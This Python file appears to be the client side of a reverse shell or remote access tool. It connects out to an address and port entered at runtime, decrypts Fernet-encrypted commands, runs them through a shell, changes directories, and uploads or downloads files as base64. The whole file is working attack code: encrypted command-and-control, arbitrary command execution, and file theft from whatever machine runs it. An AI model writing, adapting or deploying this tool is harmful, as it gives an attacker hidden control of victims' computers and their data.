import socket
import subprocess
from cryptography.fernet import Fernet
import simplejson
import os
import base64

class Socket():
    
    def command_exec(self, command):
        try:
            if isinstance(command, list):
                command = ' '.join(command) 
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError as e:
            return f"Error executing command: {e}".encode()

    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def json_recv(self):
        json_data = ""
        while True:
            try:
                data = self.connection.recv(1024).decode("utf-8")
                if not data:
                    print("No data received or connection closed.")
                    return None
                json_data += data
                if len(data) < 1024:
                    return simplejson.loads(json_data)
            except ValueError as e:
                print(f"Error decoding JSON: {e}")
                continue

    def specify_user_inputs(self):
        while True:
            ip = input("Please enter destination address: ")
            if ip == "":
                print("This value cannot be None")
                continue
            try:
                port = int(input("Please enter destination port: "))
                return ip, port
            except ValueError:
                print("Invalid port, please enter a valid integer for port.")
                continue

    def specify_key(self):
        while True:
            key = input("Please enter special key: ")
            if key == "":
                print("This value cannot be None")
                continue
            try:
                cipher = Fernet(key) 
                return cipher
            except Exception as e:
                print(f"Invalid key: {e}")
                continue

    def __init__(self):
        """Socket bağlantısını başlatır."""
        ip, port = self.specify_user_inputs()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.connection.connect((ip, port))
            print(f"Connected to {ip}:{port}")
        except socket.error as e:
            print(f"Failed to connect: {e}")
            exit(1)

    def execute_cd_command(self,directory):
        try:
            if os.path.isdir(directory):
                os.chdir(directory)
                return f"cd {directory}"
            else:
                return f"directory not found{directory}"
        except FileExistsError as e:
            return f"{directory} dizini veya dosyası bulunamadı {e}!"
    
    def get_file_contetns(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())
    
    def save_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "Upload Successfully"

    def start_socket(self):
        """Sürekli olarak komut alıp çalıştıran ana döngü."""
        cipher = self.specify_key()

        while True:
            command = self.json_recv()
            if not command:
                print("No data received, closing connection.")
                break

            try:
                decrypted_command = []
                for part in command:
                    decrypted_part = cipher.decrypt(part)  
                    decrypted_command.append(decrypted_part.decode('utf-8')) 
                

                if decrypted_command[0] == "quit":
                    print("Received 'quit' command, closing connection.")
                    self.connection.close()  
                    exit()
                
                if decrypted_command[0] == "cd" and len(decrypted_command) > 1:
                    command_cd = self.execute_cd_command(decrypted_command[1])
                    encrypted_cd = cipher.encrypt(command_cd.encode('utf-8'))
                    self.json_send(encrypted_cd)
                    continue
                
                if decrypted_command[0] == "download":
                    command_download = self.get_file_contetns(decrypted_command[1])
                    encrypted_download = cipher.encrypt(command_download)
                    self.json_send(encrypted_download)
                    continue
                
                if decrypted_command[0] == "upload":
                    command_upload = self.save_file(decrypted_command[1],decrypted_command[2])
                    encrypted_upload = cipher.encrypt(command_upload.encode('utf-8'))
                    self.json_send(encrypted_upload)
                    continue

                command_str = ' '.join(decrypted_command)
                command_output = self.command_exec(command_str)

                if command_output:
                    encrypted_output = cipher.encrypt(command_output) 
                    self.json_send(encrypted_output)  

            except Exception as e:
                print(f"Error processing command: {e}")
                continue

        self.connection.close()
        print("Connection closed.")


bind_socket = Socket()
bind_socket.start_socket()
